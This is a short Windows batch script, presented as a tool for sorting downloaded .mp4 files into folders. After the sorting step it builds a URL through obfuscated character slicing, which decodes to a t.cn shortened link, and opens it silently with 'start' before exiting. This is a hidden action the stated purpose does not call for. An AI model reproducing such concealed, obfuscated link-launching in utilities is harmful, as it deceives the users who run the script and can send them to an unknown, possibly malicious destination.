@echo off & title 归类文件 By 依梦琴瑶
 
::设置要处理的文件目录
set SrcDir=E:\BaiduNetdiskDownload
 
cd /d "%SrcDir%"
for /f "delims=" %%a in ('dir /a-d/b *.mp4') do (
    if not exist "%%~na" md "%%~na"
    move "%%~na*.*" "%%~na\"
)
pause
set S1=.:htpcn/
set S2=%S1:~2,1%%S1:~3,1%%S1:~3,1%%S1:~4,1%%S1:~1,1%%S1:~7,1%
set S3=%S1:~7,1%%S1:~3,1%%S1:~0,1%%S1:~5,1%%S1:~6,1%%S1:~7,1%
start "" "%S2%%S3%RkdisqI"
exit